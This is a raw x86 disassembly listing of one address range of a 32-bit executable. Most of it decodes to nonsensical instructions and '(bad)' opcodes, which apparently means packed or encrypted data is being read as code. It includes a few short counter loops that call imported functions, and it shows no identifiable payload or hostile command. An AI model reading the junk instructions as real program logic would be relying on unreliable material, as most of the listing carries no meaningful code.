  409cbf:	xchg   BYTE PTR [edx-0x66dc7b08],ch
  409cc5:	cmp    esi,esp
  409cc7:	inc    edx
  409cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc9:	push   esi
  409cca:	push   0x16
  409ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ccd:	mov    ds:0x464e39d2,al
  409cd2:	jp     0x409cdf
  409cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cd5:	or     eax,0x9f11d9d6
  409cda:	scas   al,BYTE PTR es:[edi]
  409cdb:	cld    
  409cdc:	scas   eax,DWORD PTR es:[edi]
  409cdd:	and    bl,BYTE PTR [ebp+0x5cc532f0]
  409ce3:	aad    0x5d
  409ce5:	aad    0x62
  409ce7:	in     al,dx
  409ce8:	ss call 0x86582133
  409cee:	adc    BYTE PTR [edi],dl
  409cf0:	push   0x7ab8f930
  409cf5:	mov    ds:0x64945e95,al
  409cfa:	js     0x409d01
  409cfc:	fmul   DWORD PTR ds:0x94cd6de8
  409d02:	bnd je 0x409ce9
  409d05:	mov    ebx,0xc2451f5f
  409d0a:	mov    dl,0x7c
  409d0c:	test   eax,0x3e71199c
  409d11:	xchg   DWORD PTR [eax+0x45],edi
  409d14:	mov    eax,ds:0x974408d5
  409d19:	js     0x409d5e
  409d1b:	jmp    0x409ca9
  409d1d:	inc    edx
  409d1e:	push   edx
  409d1f:	ror    DWORD PTR [edi+0x39],1
  409d22:	out    dx,al
  409d23:	mov    dh,0x25
  409d25:	ror    DWORD PTR [esi-0x576eac7c],0xd0
  409d2c:	(bad)  
  409d2d:	dec    ebp
  409d2e:	inc    esi
  409d2f:	jmp    0x409ce3
  409d31:	cmp    BYTE PTR [edi+eiz*4-0x6fa2051b],0x6
  409d39:	sbb    ch,ch
  409d3b:	dec    edi
  409d3c:	fs push edi
  409d3e:	inc    esp
  409d3f:	fimul  WORD PTR [ecx]
  409d41:	cmp    eax,0x3c76a96e
  409d46:	(bad)  
  409d47:	(bad)  
  409d49:	and    al,0xdd
  409d4b:	in     al,dx
  409d4c:	xor    cl,BYTE PTR [ebx]
  409d4e:	adc    bl,cl
  409d50:	sub    edi,DWORD PTR [ebx-0x225da29]
  409d56:	add    eax,0x1c62a002
  409d5b:	or     eax,0x8edaff4f
  409d60:	mov    bh,0x8c
  409d62:	or     bl,BYTE PTR [ebx+ecx*4+0xed15229]
  409d69:	jo     0x409d2b
  409d6b:	scas   al,BYTE PTR es:[edi]
  409d6c:	cdq    
  409d6d:	rol    BYTE PTR [esi],1
  409d6f:	xchg   edi,eax
  409d70:	dec    edi
  409d71:	ins    BYTE PTR es:[di],dx
  409d73:	cmp    BYTE PTR ss:[ebp+0x1b48b949],cl
  409d7a:	xchg   ebx,eax
  409d7b:	ja     0x409d78
  409d7d:	or     eax,0x8594c42c
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433697,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43368b
  409d9c:	sub    DWORD PTR ds:0x43375f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4336d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	imul   edx,DWORD PTR [edx],0x6b
  409dc1:	fidivr DWORD PTR [eax]
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409e07
  409dcb:	dec    edi
  409dcc:	or     eax,0xddb0f9cb
  409dd1:	jbe    0x409d5a
  409dd3:	add    bh,ch
  409dd5:	loope  0x409d67
  409dd7:	pop    ss
  409dd8:	xor    dh,BYTE PTR [edx+edx*8]
  409ddb:	xchg   ecx,eax
  409ddc:	mov    dl,0xba
  409dde:	jbe    0x409e39
  409de0:	cld    
  409de1:	nop
  409de2:	in     eax,0xc2
  409de4:	adc    BYTE PTR [edi+eiz*1],ch
  409de7:	or     ch,dl
  409de9:	mov    ah,0x69
  409deb:	(bad)  
  409dec:	(bad)  [ebp+0x4ea356a0]
  409df2:	fwait
  409df3:	popf   
  409df4:	adc    DWORD PTR [edi+0x310b8c58],edi
  409dfa:	rcl    DWORD PTR [ebx+0x12f0e933],cl
  409e00:	cmp    edx,esi
  409e02:	pop    esi
  409e03:	scas   eax,DWORD PTR es:[edi]
  409e04:	retf   
  409e05:	or     BYTE PTR [ebp-0x4],dl
  409e08:	scas   al,BYTE PTR es:[edi]
  409e09:	into   
  409e0a:	sbb    dl,BYTE PTR [edx+esi*1]
  409e0d:	dec    edx
  409e0e:	pushf  
  409e0f:	pop    ebp
  409e10:	fwait
  409e11:	test   edi,edi
  409e13:	sti    
  409e14:	test   DWORD PTR [ebp+0x59c93271],ebx
  409e1a:	mov    ?,WORD PTR [eax+ecx*2-0x37]
  409e1e:	lock (bad) 
  409e21:	mov    edi,esp
  409e23:	popf   
  409e24:	mov    al,ds:0x39645c87
  409e29:	mov    cl,0xb2
  409e2b:	lea    edx,[edi-0x3ebc739c]
  409e31:	or     DWORD PTR [edi-0x3bf5fa40],edi
  409e37:	retf   
  409e38:	mov    ch,0xe1
  409e3a:	mov    dh,0xf5
  409e3c:	int    0xb4
  409e3e:	mov    bl,0xc7
  409e40:	nop
  409e41:	dec    esp
  409e42:	mov    ds:0xbe05b977,eax
  409e47:	or     eax,0xe9ec3926
  409e4c:	enter  0xc28c,0xc1
  409e50:	jmp    0x409ed1
  409e52:	jo     0x409dd5
  409e54:	add    ch,BYTE PTR ds:0xa00e9207
  409e5a:	xchg   ebx,eax
  409e5b:	cmp    ah,BYTE PTR [eax]
  409e5d:	lahf   
  409e5e:	push   ss
  409e5f:	xchg   esp,eax
  409e60:	aas    
  409e61:	sar    DWORD PTR [ebp-0x3fe8f663],0xfc
  409e68:	cwde   
  409e69:	pop    ecx
  409e6a:	cmp    al,0x8c
  409e6c:	imul   eax,DWORD PTR [ebp-0x12],0xffffffd3
  409e70:	jns    0x409e2f
  409e72:	nop
  409e73:	push   0x9b60ea44
  409e78:	das    
  409e79:	sub    eax,0xeafd769
  409e7e:	or     BYTE PTR [edi-0x150d9203],0x82
  409e85:	mov    edx,0xf1457f83
  409e8b:	jnp    0x409e14
  409e8d:	xchg   esi,eax
  409e8e:	and    DWORD PTR [ecx],esp
  409e90:	fist   WORD PTR [esi+0x3a]
  409e93:	mov    eax,0x9389e3b9
  409e98:	pop    ebp
  409e99:	fwait
  409e9a:	or     dh,BYTE PTR [ebp+0x4]
  409e9d:	imul   ebx,DWORD PTR ds:0x4a9792f,0xa0aaec38
  409ea7:	mov    ds:0xfdf6bf04,eax
  409eac:	ds dec ebp
  409eae:	in     al,dx
  409eaf:	sbb    eax,0xe2b02807
  409eb4:	dec    eax
  409eb5:	or     al,0xca
  409eb7:	retf   
  409eb8:	dec    ebx
  409eb9:	push   ss
  409eba:	xchg   esi,eax
  409ebb:	pop    esi
  409ebc:	ins    DWORD PTR es:[edi],dx
  409ebd:	retf   
  409ebe:	pop    edi
  409ebf:	add    BYTE PTR [esi+0x78],dh
  409ec2:	inc    ebx
  409ec3:	inc    esp
  409ec4:	int    0x7c
  409ec6:	test   BYTE PTR [edx-0x67],al
  409ec9:	jnp    0x409ed5
  409ecb:	in     eax,0x68
  409ecd:	inc    ebp
  409ece:	xchg   ebx,eax
  409ecf:	popa   
  409ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed1:	xchg   edi,eax
  409ed2:	cmc    
  409ed3:	add    al,0x36
  409ed5:	mov    ch,0xc7
  409ed7:	mov    dh,0x19
  409ed9:	xor    BYTE PTR [edi],dh
  409edb:	js     0x409ea3
  409edd:	xchg   ebp,eax
  409ede:	cmc    
  409edf:	mov    edi,0xce33fb2b
  409ee4:	pop    ebx
  409ee5:	dec    ecx
  409ee6:	add    eax,0x96b3780c
  409eeb:	inc    eax
  409eec:	inc    ebx
  409eed:	mov    ebp,0xb8314052
  409ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ef3:	les    edi,FWORD PTR [ecx+eiz*8]
  409ef6:	xchg   esp,eax
  409ef7:	aaa    
  409ef8:	aaa    
  409ef9:	rcr    BYTE PTR [edx+eiz*2-0x27bb0ffc],1
  409f00:	jecxz  0x409eef
  409f02:	xchg   ebx,eax
  409f03:	dec    eax
  409f04:	dec    ebx
  409f05:	adc    al,0x79
  409f07:	aad    0xe3
  409f09:	xchg   edi,eax
  409f0a:	(bad)  
  409f0b:	test   BYTE PTR [ebx+ecx*2-0x3f267af1],0xcf
  409f13:	rol    al,cl
  409f15:	fyl2x  
  409f17:	cmp    BYTE PTR [edi+0x297aa702],dl
  409f1d:	add    DWORD PTR [ebx-0x6d],0x6512e3e6
  409f24:	nop
  409f25:	sub    BYTE PTR [eax-0x79],0x31
  409f29:	mov    ah,0x4c
  409f2b:	add    al,bl
  409f2d:	(bad)  
  409f2e:	fimul  WORD PTR [ecx+edx*4-0x4e]
  409f32:	jp     0x409f57
  409f34:	jne    0x409f22
  409f36:	(bad)  
  409f38:	inc    ebp
  409f39:	add    BYTE PTR [esi-0x70],bh
  409f3c:	pop    ds
  409f3d:	repz (bad)
  409f40:	pop    edx
  409f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f42:	outs   dx,DWORD PTR ds:[esi]
  409f43:	lods   al,BYTE PTR ds:[esi]
  409f44:	hlt    
  409f45:	sbb    al,0x85
  409f47:	dec    edi
  409f48:	sub    DWORD PTR cs:[esi+0x72],edx
  409f4c:	sub    cl,BYTE PTR [edi]
  409f4e:	jno    0x409f18
  409f50:	pop    edx
  409f52:	mov    ds:0x22fb96a8,eax
  409f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f58:	jne    0x409f85
  409f5a:	fist   DWORD PTR ds:0x40e1bfe
  409f60:	es jb  0x409f69
  409f63:	mov    WORD PTR [edi+ebx*2-0x5b68f019],gs
  409f6a:	rol    DWORD PTR [ebx-0x646477f7],1
  409f70:	xchg   edx,eax
  409f71:	cmp    ebp,DWORD PTR ds:0xd79dfadb
  409f77:	jge    0x409f80
  409f79:	adc    esp,DWORD PTR [edx+0x44a44cc7]
  409f7f:	xlat   BYTE PTR ds:[ebx]
  409f80:	vhsubpd ymm3,ymm0,YMMWORD PTR [ebx+0x7259b2d]
  409f88:	sbb    al,0x28
  409f8a:	js     0x40a001
  409f8c:	repz imul ecx,DWORD PTR [edx+0x17],0xc1feaaff
  409f94:	inc    edx
  409f95:	fsub   st,st(1)
  409f97:	or     DWORD PTR [eax-0x73],ebp
  409f9a:	cwde   
  409f9b:	jmp    0x57f8:0x426f28c1
  409fa2:	out    0xb8,al
  409fa4:	add    dh,BYTE PTR [eax+esi*1-0x50]
  409fa8:	std    
  409fa9:	out    0x79,eax
  409fab:	leave  
  409fac:	scas   eax,DWORD PTR es:[edi]
  409fad:	in     al,0x4
  409faf:	adc    al,0xb5
  409fb1:	sub    esi,esi
  409fb3:	jbe    0x409f75
  409fb5:	lods   al,BYTE PTR ds:[esi]
  409fb6:	mov    ch,0x65
  409fb8:	mov    ebx,cr7
  409fbb:	gs mov edx,0x35042c11
  409fc1:	mov    esi,0xa49b59b5
  409fc6:	aaa    
  409fc7:	cmp    BYTE PTR [eax+0x3138cc46],dh
  409fcd:	pusha  
  409fce:	jns    0x409fd6
  409fd0:	cld    
  409fd1:	sti    
  409fd2:	cmp    ecx,DWORD PTR [ecx+0x7c73865f]
  409fd8:	or     al,0xf6
  409fda:	dec    esi
  409fdb:	in     al,dx
  409fdc:	int    0x89
  409fde:	adc    DWORD PTR [eax+ebx*2+0x7c],eax
  409fe2:	shr    DWORD PTR [eax+ebx*4],cl
  409fe5:	je     0x40a063
  409fe7:	popf   
  409fe8:	mov    dl,0x7b
  409fea:	cs mov ah,0x4d
  409fed:	(bad)  [esp+ecx*4-0x36d44451]
  409ff4:	int    0x28
  409ff6:	out    dx,eax
  409ff7:	pop    edx
  409ff8:	pop    edi
  409ff9:	rcr    BYTE PTR [edx+0x58],1
  409ffc:	pop    ss
  409ffd:	lock mov BYTE PTR [ebx+0x72],ah
  40a001:	push   ebp
  40a002:	aad    0x96
  40a004:	daa    
  40a005:	mov    bh,0x3d
  40a007:	ja     0x409fa9
  40a009:	cmp    BYTE PTR [edx-0x24845de5],0xc2
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433753
  40a01e:	sbb    DWORD PTR ds:0x43368f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4336e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4336a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4336db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4336db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4336db,ecx
  40a059:	cmp    DWORD PTR ds:0x4336db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4338be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4336db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43368b,0x11
  40a090:	cmp    DWORD PTR ds:0x43368b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43368b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43368b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43368b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43368b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43368b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43368b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433683,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4336ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433693
  40a0ff:	mov    DWORD PTR ds:0x4336ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4336e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	scas   eax,DWORD PTR es:[edi]
  40a127:	jno    0x40a1a7
  40a129:	pop    esi
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0ca
  40a133:	mov    eax,ds:0x1326cd84
  40a138:	push   ss
  40a139:	pop    ds
  40a13a:	add    al,0xe6
  40a13c:	mov    esi,0x6f7cb36f
  40a141:	outs   dx,DWORD PTR ds:[esi]
  40a142:	adc    BYTE PTR [eax],cl
  40a144:	out    0x77,eax
  40a146:	mov    BYTE PTR [ecx],0xfb
  40a149:	jae    0x40a11a
  40a14b:	les    eax,FWORD PTR [eax-0x15]
  40a14e:	pop    edi
  40a14f:	mov    ds:0xdb8020,al
  40a154:	pop    ecx
  40a155:	xlat   BYTE PTR ds:[ebx]
  40a156:	jbe    0x40a17f
  40a158:	inc    esi
  40a159:	xchg   ecx,eax
  40a15a:	mov    al,ds:0x2272aeea
  40a15f:	xor    bp,dx
  40a162:	mov    edi,0x8fa697f0
  40a167:	std    
  40a168:	xor    bh,bh
  40a16a:	cwde   
  40a16b:	cmp    DWORD PTR [ebx-0xd],edi
  40a16e:	ins    BYTE PTR es:[edi],dx
  40a16f:	mov    eax,0x2f516c96
  40a174:	mov    eax,ds:0xd8e7812e
  40a179:	(bad)  
  40a17a:	jae    0x40a1e5
  40a17c:	cmp    DWORD PTR [edi-0x5c751cd7],edi
  40a182:	jl     0x40a13b
  40a184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a185:	add    BYTE PTR [esi+0x7d72bd9c],bh
  40a18b:	jle    0x40a1dd
  40a18d:	sbb    al,0xd2
  40a18f:	and    dl,BYTE PTR [edx]
  40a191:	sbb    BYTE PTR [esi+0x43],0xd8
  40a195:	or     al,0x8a
  40a197:	mov    bl,0xc2
  40a199:	sbb    BYTE PTR [edi+0x6b15901d],al
  40a19f:	(bad)  
  40a1a0:	or     dh,cl
  40a1a2:	push   0xffffffc2
  40a1a4:	js     0x40a178
  40a1a6:	ss or  dl,ah
  40a1a9:	xchg   esp,eax
  40a1aa:	mov    ah,0x18
  40a1ac:	adc    esi,DWORD PTR [ecx+eiz*8+0x2539d9f2]
  40a1b3:	dec    ebx
  40a1b4:	jmp    0x40a147
  40a1b6:	mov    ecx,0xe64c9e57
  40a1bb:	je     0x40a185
  40a1bd:	or     esp,DWORD PTR [eax-0x41]
  40a1c0:	sbb    eax,0x4e5fdf61
  40a1c5:	or     ah,BYTE PTR [ebx-0x1b197fa5]
  40a1cb:	add    dh,BYTE PTR [edi+0x1f]
  40a1ce:	jbe    0x40a225
  40a1d0:	push   esp
  40a1d1:	fwait
  40a1d2:	and    al,BYTE PTR [esp+ebx*2]
  40a1d5:	xor    eax,0xd449a59
  40a1da:	inc    ecx
  40a1db:	call   0x140a:0x13710338
  40a1e2:	and    DWORD PTR [eax+0x4f],0x4878a3ff
  40a1e9:	mov    eax,0xa526a7f1
  40a1ee:	add    al,0xfc
  40a1f0:	ficom  DWORD PTR [ebp+0x1b90f71c]
  40a1f6:	dec    edx
  40a1f7:	mov    cl,0x4d
  40a1f9:	jns    0x40a271
  40a1fb:	iret   
  40a1fc:	xchg   edx,eax
  40a1fd:	out    dx,eax
  40a1fe:	xchg   DWORD PTR [edx-0x49a67dbb],eax
  40a204:	mov    ds:0x17c215b3,al
  40a209:	dec    ebp
  40a20a:	mov    al,0xda
  40a20c:	mov    ds,esp
  40a20e:	in     eax,0x2a
  40a210:	sub    cl,BYTE PTR [ebp+0x2c]
  40a213:	ror    dl,0x5f
  40a216:	jg     0x40a21b
  40a218:	adc    edx,DWORD PTR [ebx+0x10371495]
  40a21e:	leave  
  40a21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a220:	mov    WORD PTR [ecx-0x5df96c89],?
  40a226:	xor    DWORD PTR [edi+0x114db327],esp
  40a22c:	mov    ah,0x4f
  40a22e:	std    
  40a22f:	pop    esi
  40a230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a231:	std    
  40a232:	xor    al,0x80
  40a234:	cmp    BYTE PTR [ecx+0x68],0xbb
  40a238:	in     al,dx
  40a239:	adc    al,0xa5
  40a23b:	sbb    al,0x18
  40a23d:	pop    eax
  40a23e:	lods   al,BYTE PTR ds:[esi]
  40a23f:	xchg   edx,eax
  40a240:	arpl   WORD PTR [ebx],si
  40a242:	sar    DWORD PTR [ecx],cl
  40a244:	mov    ah,0x7a
  40a246:	mov    ecx,0x770e9ce5
  40a24b:	test   eax,0x3e587658
  40a250:	push   ebx
  40a252:	push   ebx
  40a253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a254:	fnstsw WORD PTR [ecx+0x9]
  40a257:	ins    BYTE PTR es:[edi],dx
  40a258:	dec    ecx
  40a259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a25a:	je     0x40a1e1
  40a25c:	push   edi
  40a25d:	mov    cs,WORD PTR [esi+0x4d]
  40a260:	mov    ecx,0x50ad6b2b
  40a265:	int    0xd4
  40a267:	and    al,0xfd
  40a269:	and    dh,bl
  40a26b:	in     al,dx
  40a26c:	stos   DWORD PTR es:[edi],eax
  40a26d:	inc    edx
  40a26e:	dec    edx
  40a26f:	sar    DWORD PTR [ebx+0x36b31286],cl
  40a275:	(bad)  
  40a276:	cwde   
  40a277:	pop    eax
  40a278:	mov    dl,0x74
  40a27a:	lahf   
  40a27b:	xchg   ecx,eax
  40a27c:	or     ebx,DWORD PTR [ebx+0x17]
  40a27f:	sbb    dh,BYTE PTR [edx-0x11]
  40a282:	mov    edx,0xe2b6fdc5
  40a287:	arpl   WORD PTR [ebx-0x43],bx
  40a28a:	pop    ecx
  40a28b:	nop
  40a28c:	gs pushf 
  40a28e:	push   ecx
  40a28f:	dec    eax
  40a290:	inc    bp
  40a292:	fsub   st,st(7)
  40a294:	out    0x31,eax
  40a296:	retf   
  40a297:	cmc    
  40a298:	adc    DWORD PTR [eax+0x37d4c29e],ebp
  40a29e:	cli    
  40a29f:	xor    eax,0x5bb26670
  40a2a4:	lock pop ecx
  40a2a6:	gs (bad) 
  40a2a8:	sti    
  40a2a9:	rol    BYTE PTR [ebx-0x3ddd9585],0x5e
  40a2b0:	sbb    ecx,0x6b7e51d
  40a2b6:	lahf   
  40a2b7:	cld    
  40a2b8:	push   ebp
  40a2b9:	mov    edi,0xee8e9ae7
  40a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bf:	dec    BYTE PTR [edx]
  40a2c1:	fiadd  WORD PTR [ebx-0x358cb002]
  40a2c7:	call   0x7cbba6a9
  40a2cc:	sub    bh,ah
  40a2ce:	xchg   esi,eax
  40a2cf:	retf   0x2096
  40a2d2:	in     al,0x5b
  40a2d4:	and    eax,0xd472d07c
  40a2d9:	inc    ebx
  40a2da:	ffreep st(1)
  40a2dc:	push   eax
  40a2dd:	ja     0x40a2f5
  40a2df:	cli    
  40a2e0:	pusha  
  40a2e1:	call   0xf453:0x215ce364
  40a2e8:	dec    eax
  40a2e9:	push   cs
  40a2ea:	pop    edi
  40a2eb:	or     BYTE PTR [ebx-0x420a101f],ch
  40a2f1:	in     al,dx
  40a2f2:	mul    ch
  40a2f4:	cmp    BYTE PTR [ecx],0x65
  40a2f7:	push   ebp
  40a2f8:	pop    esi
  40a2f9:	xchg   edi,eax
  40a2fa:	mov    gs,WORD PTR gs:[edx-0x56799092]
  40a301:	mov    ebp,0xdb9d08e9
  40a306:	add    eax,0xf2026c26
  40a30b:	dec    ecx
  40a30c:	dec    esi
  40a30d:	push   es
  40a30e:	xor    BYTE PTR [ebx],0x8c
  40a311:	sbb    ah,cl
  40a313:	pop    eax
  40a314:	ja     0x40a320
  40a316:	out    0xd,eax
  40a318:	xor    al,0x88
  40a31a:	dec    ebp
  40a31b:	dec    ecx
  40a31c:	scas   al,BYTE PTR es:[edi]
  40a31d:	aas    
  40a31e:	cmc    
  40a31f:	repz mov cl,0x9c
  40a322:	mov    ecx,0xfb107a2e
  40a327:	or     esi,edx
  40a329:	push   edx
  40a32a:	stc    
  40a32b:	inc    eax
  40a32c:	mov    eax,ds:0x6a5dfd1c
  40a331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a332:	out    0x8,eax
  40a334:	ds out 0xcd,eax
  40a337:	jo     0x40a329
  40a339:	iret   
  40a33a:	jmp    0xbbed:0x9a6b3e9f
  40a341:	cmp    DWORD PTR [esi],ecx
  40a343:	sahf   
  40a344:	pop    ss
  40a345:	pop    es
  40a346:	dec    ebx
  40a347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a348:	cdq    
  40a349:	push   ecx
  40a34a:	addr16 hlt 
  40a34c:	pop    ds
  40a34d:	icebp  
  40a34e:	stos   BYTE PTR es:[edi],al
  40a34f:	jg     0x40a3ce
  40a351:	jl     0x40a3c9
  40a353:	xchg   ecx,eax
  40a354:	mov    ecx,0x821c73d2
  40a359:	xor    ch,bh
  40a35b:	mov    ah,0xe7
  40a35d:	add    al,0x46
  40a360:	mov    cs:0xf04a2f87,al
  40a366:	or     esi,ebp
  40a368:	mov    edi,0x4a4eeb37
  40a36d:	out    dx,al
  40a36e:	xor    ecx,DWORD PTR ds:0xeb22272f
  40a374:	mov    al,ds:0x8b8e78b9
  40a379:	dec    ebp
  40a37a:	call   0x25c26bb2
  40a37f:	jnp    0x40a3b7
  40a381:	inc    ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	jnp    0x40a3c8
  40a392:	inc    ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	jnp    0x40a3ce
  40a398:	inc    ebx
  40a399:	add    BYTE PTR [ebx+0x43367b3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43367b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43376f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4336eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4336e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4336e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4336e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433717
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4336e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4336e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4336e7,eax
  40a43a:	mov    eax,ds:0x4336e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4336e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43369f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4337af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4337a3,0x433727
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433687,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	pop    ss
  40a49c:	out    0x44,al
  40a49e:	sub    DWORD PTR [esi+ebp*8+0x7e],ecx
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a474
  40a4a8:	sub    BYTE PTR [ecx+0x2143d554],0xca
  40a4af:	jge    0x40a4f5
  40a4b1:	test   DWORD PTR cs:[ebx],esp
  40a4b4:	pop    ebx
  40a4b5:	mov    ds:0xa0d87b,eax
  40a4ba:	inc    ebp
  40a4bb:	ret    
  40a4bc:	mov    BYTE PTR [ebx+0x76d8b948],0x28
  40a4c3:	into   
  40a4c4:	push   ecx
  40a4c5:	mov    cl,0xcd
  40a4c7:	test   al,0x61
  40a4c9:	or     BYTE PTR [eax-0x2d],0x7e
  40a4cd:	lods   al,BYTE PTR ds:[esi]
  40a4ce:	adc    edx,esi
  40a4d0:	xchg   esi,ecx
  40a4d2:	int    0xc
  40a4d4:	dec    ebx
  40a4d5:	clc    
  40a4d6:	das    
  40a4d7:	inc    DWORD PTR [edx+ebp*2]
  40a4da:	jo     0x40a4c2
  40a4dc:	repnz popa 
  40a4de:	dec    ebx
  40a4df:	cs jns 0x40a475
  40a4e2:	sti    
  40a4e3:	fisub  DWORD PTR [esi+0x538621ae]
  40a4e9:	clc    
  40a4ea:	adc    eax,0x40ccac1a
  40a4ef:	dec    ebx
  40a4f0:	aad    0x87
  40a4f2:	xor    dh,dl
  40a4f4:	pop    ds
  40a4f5:	mov    dl,0x17
  40a4f7:	aam    0xb5
  40a4f9:	gs and ebp,esp
  40a4fc:	pop    ss
  40a4fd:	pop    edx
  40a4fe:	stos   DWORD PTR es:[edi],eax
  40a4ff:	mov    edi,0x698bf82c
  40a504:	sahf   
  40a505:	into   
  40a506:	aas    
  40a507:	cmp    BYTE PTR [ecx],0x37
  40a50a:	fsub   DWORD PTR [edx+0x6d1caf9f]
  40a510:	lock jnp 0x40a4a7
  40a513:	repnz scas al,BYTE PTR es:[edi]
  40a515:	fwait
  40a516:	sub    DWORD PTR [edi+ecx*4-0x2b1f0af7],eax
  40a51d:	ss aaa 
  40a51f:	fwait
  40a520:	(bad)  
